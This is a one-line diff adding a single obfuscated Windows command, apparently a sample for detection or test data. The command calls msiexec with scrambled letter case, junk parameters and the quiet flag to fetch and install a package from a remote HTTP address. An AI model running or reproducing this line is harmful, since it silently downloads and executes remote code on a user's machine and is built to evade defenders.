@@ -1,0 +1,1 @@
+C:\Windows\System32\msiexec.exe mSiexEc hJPBi=HcquJv -FV htTp://0J.WF:8080/A/RytTjk7hx/r9c6v/kCuV6LjmgVU/WLPF1HN6S4?ksalaru ZOzmQPh=uGXp FiqkXg=HFR /Q dB=gKXntpWm OiOc=sGMv MsO=St
